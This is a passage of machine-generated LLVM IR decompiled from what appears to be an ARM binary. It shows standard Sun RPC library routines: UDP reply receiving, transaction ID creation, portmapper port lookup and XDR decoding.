  %tmp117 = add i32 %tmp116, %v3_16c64
  %tmp118 = udiv i32 %tmp117, 1000000
  %tmp121 = add i32 %v2_16c5c, 1
  %tmp123 = add i32 %tmp121, %tmp118
  %tmp147 = mul i32 %tmp118, -1000000
  %tmp124 = add i32 %tmp117, %tmp147
  store i32 999999, i32* %r3.global-to-local, align 4
  store i32 %tmp124, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16cbc

dec_label_pc_16cbc:                               ; preds = %dec_label_pc_16c7c.lr.ph, %dec_label_pc_16c50
  %stack_var_-9024.3.lcssa = phi i32 [ %tmp123, %dec_label_pc_16c7c.lr.ph ], [ %v2_16c5c, %dec_label_pc_16c50 ]
  %v0_16cdc = phi i32 [ %tmp124, %dec_label_pc_16c7c.lr.ph ], [ %v2_16c70, %dec_label_pc_16c50 ]
  store i32 %storemerge7, i32* %r0.global-to-local, align 4
  %v5_16ccc = icmp slt i32 %stack_var_-9024.3.lcssa, %storemerge7
  br i1 %v5_16ccc, label %dec_label_pc_16afc, label %dec_label_pc_16cd0

dec_label_pc_16cd0:                               ; preds = %dec_label_pc_16cbc
  %v9_16cc8 = icmp eq i32 %stack_var_-9024.3.lcssa, %storemerge7
  br i1 %v9_16cc8, label %dec_label_pc_16cd4, label %dec_label_pc_169e8

dec_label_pc_16cd4:                               ; preds = %dec_label_pc_16cd0
  %v5_16ce0 = icmp slt i32 %v0_16cdc, %storemerge6
  br i1 %v5_16ce0, label %dec_label_pc_16afc, label %dec_label_pc_169e8

dec_label_pc_16cf8:                               ; preds = %dec_label_pc_16b9c
  store i32 %v4_16cf8, i32* %r3.global-to-local, align 4
  br i1 %v2_16cfc, label %dec_label_pc_16e6c, label %dec_label_pc_16d04

dec_label_pc_16d04:                               ; preds = %dec_label_pc_16cf8
  store i32 %v2_16d18, i32* %r0.global-to-local, align 4
  store i32 %v34_16954, i32* %ip.global-to-local, align 4
  store i32 %v2_16d18, i32* %v4_16d28, align 4
  store i32 %v2_16d38, i32* @r4, align 4
  %v0_16d4c = load i32, i32* @sp, align 4
  %v1_16d5c = add i32 %v0_16d4c, 264
  store i32 %v1_16d5c, i32* @r7, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i32 %v2_16d38, i32* @r1, align 4
  %v0_16d78 = load i32, i32* @r6, align 4
  %v1_16d78 = inttoptr i32 %v0_16d78 to i32*
  %v2_16d78 = load i32, i32* %v1_16d78, align 4
  store i32 %v2_16d78, i32* @r0, align 4
  store i32 8192, i32* @r2, align 4
  %v3_16d80 = call i32 @__libc_recvmsg(i32 %v2_16d78, i32 %v2_16d38, i32 8192)
  store i32 %v3_16d80, i32* %r0.global-to-local, align 4
  %v1_16d84 = icmp slt i32 %v3_16d80, 0
  br i1 %v1_16d84, label %dec_label_pc_16e6c, label %dec_label_pc_16d8c

dec_label_pc_16d8c:                               ; preds = %dec_label_pc_16d04
  %v0_16d8c = load i32, i32* @r7, align 4
  store i32 %v0_16d8c, i32* %r0.global-to-local, align 4
  %v0_16d90 = load i32, i32* @r6, align 4
  %v1_16d90 = add i32 %v0_16d90, 88
  %v2_16d90 = inttoptr i32 %v1_16d90 to i32*
  %v3_16d90 = load i32, i32* %v2_16d90, align 4
  store i32 %v3_16d90, i32* @r1, align 4
  %v3_16d98 = inttoptr i32 %v0_16d8c to i8*
  %v4_16d98 = call i32 @bcmp(i8* %v3_16d98, i32 %v3_16d90, i32 %v3_16d80)
  store i32 %v4_16d98, i32* %r0.global-to-local, align 4
  store i32 %v4_16d98, i32* @r7, align 4
  %v2_16d9c = icmp eq i32 %v4_16d98, 0
  br i1 %v2_16d9c, label %dec_label_pc_16da4, label %dec_label_pc_16e6c

dec_label_pc_16da4:                               ; preds = %dec_label_pc_16d8c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e6c

dec_label_pc_16e6c:                               ; preds = %dec_label_pc_16da4, %dec_label_pc_16d8c, %dec_label_pc_16d04, %dec_label_pc_16cf8, %dec_label_pc_16ea4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 %v2_16e74, i32* %ip.global-to-local, align 4
  %v0_16e78 = load i32, i32* @r6, align 4
  %v1_16e78 = add i32 %v0_16e78, 96
  store i32 %v1_16e78, i32* @r5, align 4
  %v1_16e7c = inttoptr i32 %v0_16e78 to i32*
  %v2_16e7c = load i32, i32* %v1_16e7c, align 4
  store i32 %v2_16e7c, i32* @r0, align 4
  %v1_16e80 = add i32 %v0_16e78, 92
  %v2_16e80 = inttoptr i32 %v1_16e80 to i32*
  %v3_16e80 = load i32, i32* %v2_16e80, align 4
  store i32 %v3_16e80, i32* @r2, align 4
  store i32 %v1_16e78, i32* @r1, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v2_16e90, i32* %ip.global-to-local, align 4
  %v6_16e98 = call i32 @__libc_recvfrom(i32 %v2_16e7c, i32 %v1_16e78, i32 %v3_16e80, i32 0, i32 %v2_16e74, i32 %v2_16e90)
  store i32 %v6_16e98, i32* %r0.global-to-local, align 4
  %v1_16e9c = icmp slt i32 %v6_16e98, 0
  br i1 %v1_16e9c, label %dec_label_pc_16ea4, label %dec_label_pc_16ed4

dec_label_pc_16ea4:                               ; preds = %dec_label_pc_16e6c
  %v0_16ea4 = call i32 @__errno_location()
  store i32 %v0_16ea4, i32* %r0.global-to-local, align 4
  %v1_16ea8 = inttoptr i32 %v0_16ea4 to i32*
  %v2_16ea8 = load i32, i32* %v1_16ea8, align 4
  store i32 %v2_16ea8, i32* %r3.global-to-local, align 4
  %v7_16eac = icmp eq i32 %v2_16ea8, 4
  br i1 %v7_16eac, label %dec_label_pc_16e6c, label %dec_label_pc_16eb4

dec_label_pc_16eb4:                               ; preds = %dec_label_pc_16ea4
  %v0_16eb4 = call i32 @__errno_location()
  store i32 %v0_16eb4, i32* %r0.global-to-local, align 4
  %v1_16eb8 = inttoptr i32 %v0_16eb4 to i32*
  %v2_16eb8 = load i32, i32* %v1_16eb8, align 4
  store i32 %v2_16eb8, i32* %r0.global-to-local, align 4
  %v7_16ebc = icmp eq i32 %v2_16eb8, 11
  br i1 %v7_16ebc, label %dec_label_pc_16b80, label %dec_label_pc_16ec4

dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16b80
  %v0_16ce8 = call i32 @__errno_location()
  store i32 %v0_16ce8, i32* %r0.global-to-local, align 4
  %v1_16cec = inttoptr i32 %v0_16ce8 to i32*
  %v2_16cec = load i32, i32* %v1_16cec, align 4
  store i32 %v2_16cec, i32* %r0.global-to-local, align 4
  %v7_16cf0 = icmp eq i32 %v2_16cec, 4
  br i1 %v7_16cf0, label %dec_label_pc_16b80, label %dec_label_pc_16ec4

dec_label_pc_16ec4:                               ; preds = %dec_label_pc_16eb4, %dec_label_pc_16ec0
  %v0_16ecc = phi i32 [ %v2_16eb8, %dec_label_pc_16eb4 ], [ %v2_16cec, %dec_label_pc_16ec0 ]
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v1_16ecc = load i32, i32* @r6, align 4
  %v2_16ecc = add i32 %v1_16ecc, 48
  %v3_16ecc = inttoptr i32 %v2_16ecc to i32*
  store i32 %v0_16ecc, i32* %v3_16ecc, align 4
  br label %dec_label_pc_169f0

dec_label_pc_16ed4:                               ; preds = %dec_label_pc_16e6c
  %v7_16ed8 = icmp slt i32 %v6_16e98, 4
  br i1 %v7_16ed8, label %dec_label_pc_16b80, label %dec_label_pc_16edc

dec_label_pc_16edc:                               ; preds = %dec_label_pc_16ed4
  br i1 %v2_16a3c, label %dec_label_pc_16f00, label %dec_label_pc_16eec

dec_label_pc_16eec:                               ; preds = %dec_label_pc_16edc
  %v0_16eec = load i32, i32* @r6, align 4
  %v1_16eec = add i32 %v0_16eec, 88
  %v2_16eec = inttoptr i32 %v1_16eec to i32*
  %v3_16eec = load i32, i32* %v2_16eec, align 4
  store i32 %v3_16eec, i32* %r3.global-to-local, align 4
  %v1_16ef0 = inttoptr i32 %v3_16eec to i32*
  %v2_16ef0 = load i32, i32* %v1_16ef0, align 4
  %v1_16ef4 = add i32 %v0_16eec, 96
  %v2_16ef4 = inttoptr i32 %v1_16ef4 to i32*
  %v3_16ef4 = load i32, i32* %v2_16ef4, align 4
  store i32 %v3_16ef4, i32* %r3.global-to-local, align 4
  %v9_16ef8 = icmp eq i32 %v3_16ef4, %v2_16ef0
  br i1 %v9_16ef8, label %dec_label_pc_16f00, label %dec_label_pc_16b80

dec_label_pc_16f00:                               ; preds = %dec_label_pc_16eec, %dec_label_pc_16edc
  store i32 %v2_16f00, i32* @r4, align 4
  %v0_16f04 = load i32, i32* @r5, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v2_16f00, i32* %r0.global-to-local, align 4
  store i32 %v2_16f14, i32* @r5, align 4
  %v10_16f18 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-128, i32 %v0_16f04, i32 %v6_16e98, i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_16f00, i32* %r0.global-to-local, align 4
  %v2_16f24 = call i32 @__GI_xdr_replymsg(i32 %v2_16f00, i32 %v2_16f14)
  store i32 %v2_16f24, i32* %r0.global-to-local, align 4
  %v2_16f28 = icmp eq i32 %v2_16f24, 0
  br i1 %v2_16f28, label %dec_label_pc_16ff0, label %dec_label_pc_16f30

dec_label_pc_16f30:                               ; preds = %dec_label_pc_16f00
  store i32 %v2_16f14, i32* %r0.global-to-local, align 4
  %v0_16f34 = load i32, i32* @r6, align 4
  %v1_16f34 = add i32 %v0_16f34, 44
  %v2_16f38 = inttoptr i32 %v1_16f34 to i32*
  %v3_16f38 = call i32 @__GI__seterr_reply(i32 %v2_16f14, i32* %v2_16f38)
  store i32 %v3_16f38, i32* %r0.global-to-local, align 4
  %v0_16f3c = load i32, i32* @r6, align 4
  %v1_16f3c = add i32 %v0_16f3c, 44
  %v2_16f3c = inttoptr i32 %v1_16f3c to i32*
  %v3_16f3c = load i32, i32* %v2_16f3c, align 4
  store i32 %v3_16f3c, i32* %r3.global-to-local, align 4
  %v2_16f40 = icmp eq i32 %v3_16f3c, 0
  br i1 %v2_16f40, label %dec_label_pc_16f48, label %dec_label_pc_16fa4

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16f30
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %v2_16f50 = load i32, i32* %arg1, align 4
  store i32 %v2_16f50, i32* %r3.global-to-local, align 4
  store i32 %v2_16b50, i32* @r4, align 4
  store i32 %v2_16f50, i32* %r0.global-to-local, align 4
  %v1_16f60 = add i32 %v2_16f50, 32
  %v2_16f60 = inttoptr i32 %v1_16f60 to i32*
  %v3_16f60 = load i32, i32* %v2_16f60, align 4
  store i32 %v3_16f60, i32* %r3.global-to-local, align 4
  store i32 94060, i32* @lr, align 4
  %v1_16f68 = add i32 %v3_16f60, 8
  %v2_16f68 = inttoptr i32 %v1_16f68 to i32*
  %v3_16f68 = load i32, i32* %v2_16f68, align 4
  call void @__pseudo_branch(i32 %v3_16f68)
  %v0_16f6c = load i32, i32* %r0.global-to-local, align 4
  %v2_16f6c = icmp eq i32 %v0_16f6c, 0
  br i1 %v2_16f6c, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_16f48
  %v2_16f74 = load i32, i32* @r6, align 4
  %v3_16f74 = add i32 %v2_16f74, 44
  %v4_16f74 = inttoptr i32 %v3_16f74 to i32*
  store i32 7, i32* %v4_16f74, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_16f7c = load i32, i32* @r6, align 4
  %v3_16f7c = add i32 %v2_16f7c, 48
  %v4_16f7c = inttoptr i32 %v3_16f7c to i32*
  store i32 6, i32* %v4_16f7c, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_16f48, %bb
  store i32 %v5_16b4c, i32* %r3.global-to-local, align 4
  %v2_16f84 = icmp eq i32 %v5_16b4c, 0
  br i1 %v2_16f84, label %dec_label_pc_16ff8, label %dec_label_pc_16f8c

dec_label_pc_16f8c:                               ; preds = %.thread10
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_16f90 = load i32, i32* @r8, align 4
  %v2_16f90 = inttoptr i32 %v1_16f90 to i32*
  store i32 2, i32* %v2_16f90, align 4
  %v0_16f94 = load i32, i32* @r8, align 4
  store i32 %v0_16f94, i32* @r0, align 4
  store i32 %v2_16b50, i32* @r1, align 4
  %v0_16f9c = call i32 @xdr_opaque_auth()
  store i32 %v0_16f9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ff8

dec_label_pc_16fa4:                               ; preds = %dec_label_pc_16f30
  store i32 %stack_var_-9032.0, i32* %r0.global-to-local, align 4
  %tmp126 = icmp slt i32 %stack_var_-9032.0, 1
  br i1 %tmp126, label %dec_label_pc_16ff8, label %dec_label_pc_16fb4

dec_label_pc_16fb4:                               ; preds = %dec_label_pc_16fa4
  %v2_16fbc = load i32, i32* %arg1, align 4
  store i32 %v2_16fbc, i32* %r3.global-to-local, align 4
  store i32 %v2_16fbc, i32* %r0.global-to-local, align 4
  %v1_16fc4 = add i32 %v2_16fbc, 32
  %v2_16fc4 = inttoptr i32 %v1_16fc4 to i32*
  %v3_16fc4 = load i32, i32* %v2_16fc4, align 4
  store i32 %v3_16fc4, i32* %r3.global-to-local, align 4
  %v1_16fcc = add i32 %v3_16fc4, 12
  %v2_16fcc = inttoptr i32 %v1_16fcc to i32*
  %v3_16fcc = load i32, i32* %v2_16fcc, align 4
  call void @__pseudo_branch(i32 %v3_16fcc)
  %v0_16fd0 = load i32, i32* %r0.global-to-local, align 4
  %v2_16fd0 = icmp eq i32 %v0_16fd0, 0
  br i1 %v2_16fd0, label %dec_label_pc_16ff8, label %dec_label_pc_16fd8

dec_label_pc_16fd8:                               ; preds = %dec_label_pc_16fb4
  %v1_16fe0 = add i32 %stack_var_-9032.0, -1
  store i32 %v1_16fe0, i32* %r3.global-to-local, align 4
  %v0_16a40.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16a34

dec_label_pc_16ff0:                               ; preds = %dec_label_pc_16f00
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_16ff4 = load i32, i32* @r6, align 4
  %v2_16ff4 = add i32 %v1_16ff4, 44
  %v3_16ff4 = inttoptr i32 %v2_16ff4 to i32*
  store i32 2, i32* %v3_16ff4, align 4
  br label %dec_label_pc_16ff8

dec_label_pc_16ff8:                               ; preds = %dec_label_pc_16fb4, %dec_label_pc_16fa4, %.thread10, %dec_label_pc_16f8c, %dec_label_pc_16ff0
  %v0_16ff8 = load i32, i32* @r6, align 4
  %v1_16ff8 = add i32 %v0_16ff8, 44
  %v2_16ff8 = inttoptr i32 %v1_16ff8 to i32*
  %v3_16ff8 = load i32, i32* %v2_16ff8, align 4
  store i32 %v3_16ff8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16ffc

dec_label_pc_16ffc:                               ; preds = %dec_label_pc_169f0, %dec_label_pc_16ff8
  %v0_16ffc = phi i32 [ %v0_16ffc.pre, %dec_label_pc_169f0 ], [ %v3_16ff8, %dec_label_pc_16ff8 ]
  store i32 %v0_16ffc, i32* %r0.global-to-local, align 4
  ret i32 %v0_16ffc

; uselistorder directives
  uselistorder i32 %v0_16ffc, { 1, 0 }
  uselistorder i32 %v1_16fe0, { 1, 0 }
  uselistorder i32 %v1_16e78, { 1, 0, 2 }
  uselistorder i32 %stack_var_-9024.3.lcssa, { 1, 0, 2 }
  uselistorder i32 %tmp124, { 1, 0 }
  uselistorder i32 %v3_16c64, { 1, 0 }
  uselistorder i32 %v0_16c54, { 2, 3, 1, 0 }
  uselistorder i32 %v0_16c38.pre, { 1, 0 }
  uselistorder i32 %v1_16c34, { 1, 0 }
  uselistorder i32 %v0_16be8137, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16b90, { 1, 0, 2 }
  uselistorder i32 %v5_16b4c, { 1, 0 }
  uselistorder i32 %stack_var_-9028.2, { 1, 0, 3, 2 }
  uselistorder i32 %v0_16b0c, { 0, 3, 2, 1 }
  uselistorder i32 %stack_var_-9032.0, { 0, 2, 1 }
  uselistorder i32 %stack_var_-9028.0, { 1, 0 }
  uselistorder i32 %stack_var_-9024.0, { 1, 0 }
  uselistorder i32 %v2_16f14, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16f00, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16c3c, { 2, 1, 0 }
  uselistorder i32 %v2_16d38, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %v4_16cf8, { 1, 0 }
  uselistorder i32 %storemerge7, { 4, 5, 3, 1, 0, 2 }
  uselistorder i32 %storemerge6, { 2, 1, 0 }
  uselistorder i32 %v2_16964, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v34_16954, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i8** %stack_var_-72, { 2, 1, 0 }
  uselistorder i8* %stack_var_-144, { 2, 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 47, 46, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 34, 36, 37, 38, 39, 40, 41, 42, 44, 43, 35, 32, 1, 45, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 8, 6, 7, 10, 9, 11, 13, 12, 21, 26, 14, 15, 16, 17, 19, 18, 22, 20, 23, 24, 25, 29, 27, 28, 30, 34, 31, 32, 33, 47, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 35, 46, 1, 48, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 22, 21, 7, 8, 10, 9, 0, 11, 12, 14, 17, 15, 16, 13, 18, 19, 20 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 1, 4, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32* @sp, { 1, 3, 9, 4, 0, 10, 2, 11, 5, 12, 13, 6, 7, 8, 14 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 88, { 1, 2, 3, 4, 13, 14, 12, 10, 11, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16ffc, { 1, 0 }
  uselistorder label %dec_label_pc_16ff8, { 4, 0, 1, 3, 2 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_16ec4, { 1, 0 }
  uselistorder label %dec_label_pc_16e6c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_16c48, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16c34, { 1, 0 }
  uselistorder label %dec_label_pc_16be8, { 1, 0 }
  uselistorder label %dec_label_pc_16b80, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_16b48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16a1c, { 1, 0 }
  uselistorder label %dec_label_pc_169f0, { 0, 2, 1 }
}

define i32 @_create_xid(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v6_17024 = load i32, i32* @r5, align 4
  %v2_17028 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2f4c4.872 to i32), i32* @r2, align 4
  store i32 %v2_17028, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2f4dc.875 to i32), i32* @r4, align 4
  %v1_17044 = call i32 @__pthread_cleanup_push_defer()
  %v2_17054 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f4c4.872 to i32))
  %v2_17058 = load i32, i32* @global_var_2f4dc.875, align 4
  %v2_1705c = icmp eq i32 %v2_17058, 0
  store i32 %v2_17028, i32* @r5, align 4
  br i1 %v2_1705c, label %dec_label_pc_1706c, label %dec_label_pc_1708c

dec_label_pc_1706c:                               ; preds = %entry
  %v0_1706c = call i32 @gettimeofday()
  %v3_17070 = load i32, i32* %stack_var_-24, align 4
  %v2_1707c = xor i32 %v3_17070, %tmp
  %v2_17080 = trunc i32 %v2_1707c to i8
  %v3_17080 = call i32 @__GI_srand48_r(i8 %v2_17080, i32 ptrtoint (i32* @global_var_2f4e0.878 to i32))
  %v1_17088 = load i32, i32* @r4, align 4
  %v2_17088 = inttoptr i32 %v1_17088 to i32*
  store i32 1, i32* %v2_17088, align 4
  br label %dec_label_pc_1708c

dec_label_pc_1708c:                               ; preds = %entry, %dec_label_pc_1706c
  %v2_1708c = ptrtoint i32* %stack_var_-16 to i32
  %v2_17094 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_2f4e0.878 to i32), i32 %v2_1708c)
  store i32 %v2_17028, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 94380, i32* @lr, align 4
  %v1_170a8 = call i32 @__pthread_cleanup_pop_restore()
  %v3_170ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v6_17024, i32* @r5, align 4
  ret i32 %v3_170ac

; uselistorder directives
  uselistorder i32 ()* @gettimeofday, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1708c, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_170d4 = load i32, i32* @r4, align 4
  %v9_170d4 = load i32, i32* @r6, align 4
  %v12_170d4 = load i32, i32* @r7, align 4
  %v15_170d4 = load i32, i32* @r8, align 4
  %v18_170d4 = load i32, i32* @sb, align 4
  %v21_170d4 = load i32, i32* @sl, align 4
  %v3_170e4 = add i32 %arg1, 3
  %v4_170e4 = inttoptr i32 %v3_170e4 to i8*
  store i8 111, i8* %v4_170e4, align 1
  store i32 0, i32* @r4, align 4
  store i32 0, i32* @r6, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v3_170f4 = add i32 %arg1, 2
  %v4_170f4 = inttoptr i32 %v3_170f4 to i8*
  store i8 0, i8* %v4_170f4, align 1
  store i32 %arg2, i32* @r8, align 4
  %v0_170fc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_170fc, i32* %stack_var_-40, align 4
  store i32 %arg3, i32* @sl, align 4
  %v2_17104 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_17104, i32* %ip.global-to-local, align 4
  store i32 %arg4, i32* @sb, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  store i32 400, i32* @lr, align 4
  store i32 %arg1, i32* @r7, align 4
  %v0_1712c = load i32, i32* @r6, align 4
  %v6_1712c = trunc i32 %v0_1712c to i8
  %v8_17138 = inttoptr i32 %arg1 to i32*
  %v9_17138 = call i32 @__GI_clntudp_bufcreate(i32* %v8_17138, i32 100000, i32 2, i32 5, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_17138, i32* @r4, align 4
  %v2_1713c = icmp eq i32 %v9_17138, 0
  br i1 %v2_1713c, label %dec_label_pc_171e4, label %dec_label_pc_17144

dec_label_pc_17144:                               ; preds = %entry
  %v0_17144 = call i32 @__GI___rpc_thread_createerr()
  %v0_17148 = load i32, i32* @r8, align 4
  store i32 %v0_17148, i32* %stack_var_-56, align 4
  store i32 99320, i32* %r3.global-to-local, align 4
  %v0_1715c = load i32, i32* @r4, align 4
  %v1_1715c = add i32 %v0_1715c, 4
  %v2_1715c = inttoptr i32 %v1_1715c to i32*
  %v3_1715c = load i32, i32* %v2_1715c, align 4
  store i32 %v3_1715c, i32* %ip.global-to-local, align 4
  store i32 %v0_17144, i32* %r5.global-to-local, align 4
  %v2_17180 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_17180, i32* %r3.global-to-local, align 4
  %v1_17194 = inttoptr i32 %v3_1715c to i32*
  %v2_17194 = load i32, i32* %v1_17194, align 4
  call void @__pseudo_branch(i32 %v2_17194)
  %v1_17198 = load i32, i32* @r6, align 4
  %v9_17198 = icmp eq i32 %v0_1715c, %v1_17198
  br i1 %v9_17198, label %dec_label_pc_171c0, label %dec_label_pc_171a4

dec_label_pc_171a4:                               ; preds = %dec_label_pc_17144
  store i32 14, i32* %r3.global-to-local, align 4
  %v1_171a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_171a8 = inttoptr i32 %v1_171a8 to i32*
  store i32 14, i32* %v2_171a8, align 4
  %v3_171a8 = load i32, i32* %r5.global-to-local, align 4
  %v4_171a8 = add i32 %v3_171a8, 4
  store i32 %v4_171a8, i32* %r5.global-to-local, align 4
  %v0_171b0 = load i32, i32* @r4, align 4
  %v1_171b0 = add i32 %v0_171b0, 4
  %v2_171b0 = inttoptr i32 %v1_171b0 to i32*
  %v3_171b0 = load i32, i32* %v2_171b0, align 4
  store i32 %v3_171b0, i32* %r3.global-to-local, align 4
  %v1_171b8 = add i32 %v3_171b0, 8
  %v2_171b8 = inttoptr i32 %v1_171b8 to i32*
  %v3_171b8 = load i32, i32* %v2_171b8, align 4
  call void @__pseudo_branch(i32 %v3_171b8)
  br label %.thread

dec_label_pc_171c0:                               ; preds = %dec_label_pc_17144
  %v4_171c4 = sext i8 %v6_1712c to i32
  %v4_171c0 = mul i32 %v0_1712c, 256
  %v4_171c8 = and i32 %v4_171c0, 65280
  %v5_171c8 = or i32 %v4_171c8, %v4_171c4
  store i32 %v5_171c8, i32* %r3.global-to-local, align 4
  %v7_171c8 = icmp eq i32 %v5_171c8, 0
  br i1 %v7_171c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_171c0
  store i32 15, i32* %r3.global-to-local, align 4
  %v2_171d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_171d0 = inttoptr i32 %v2_171d0 to i32*
  store i32 15, i32* %v3_171d0, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_171c0, %dec_label_pc_171a4, %bb
  %v0_171d4 = load i32, i32* @r4, align 4
  %v1_171d8 = add i32 %v0_171d4, 4
  %v2_171d8 = inttoptr i32 %v1_171d8 to i32*
  %v3_171d8 = load i32, i32* %v2_171d8, align 4
  store i32 %v3_171d8, i32* %r3.global-to-local, align 4
  %v1_171e0 = add i32 %v3_171d8, 16
  %v2_171e0 = inttoptr i32 %v1_171e0 to i32*
  %v3_171e0 = load i32, i32* %v2_171e0, align 4
  call void @__pseudo_branch(i32 %v3_171e0)
  br label %dec_label_pc_171e4

dec_label_pc_171e4:                               ; preds = %entry, %.thread
  %v4_171e4 = sext i8 %v6_1712c to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_171e8 = mul i32 %v0_1712c, 256
  %v4_171f0 = and i32 %v4_171e8, 65280
  %v5_171f0 = or i32 %v4_171f0, %v4_171e4
  %v2_171f4 = load i32, i32* @r7, align 4
  %v3_171f4 = add i32 %v2_171f4, 3
  %v4_171f4 = inttoptr i32 %v3_171f4 to i8*
  store i8 0, i8* %v4_171f4, align 1
  %v0_171f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_171f8 = trunc i32 %v0_171f8 to i8
  %v2_171f8 = load i32, i32* @r7, align 4
  %v3_171f8 = add i32 %v2_171f8, 2
  %v4_171f8 = inttoptr i32 %v3_171f8 to i8*
  store i8 %v1_171f8, i8* %v4_171f8, align 1
  store i32 %v3_170d4, i32* @r4, align 4
  store i32 %v9_170d4, i32* @r6, align 4
  store i32 %v12_170d4, i32* @r7, align 4
  store i32 %v15_170d4, i32* @r8, align 4
  store i32 %v18_170d4, i32* @sb, align 4
  store i32 %v21_170d4, i32* @sl, align 4
  ret i32 %v5_171f0

; uselistorder directives
  uselistorder i8 %v6_1712c, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_171e4, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17218 = load i32, i32* @r4, align 4
  store i32 %v3_17218, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17224 = call i32 @xdr_u_long()
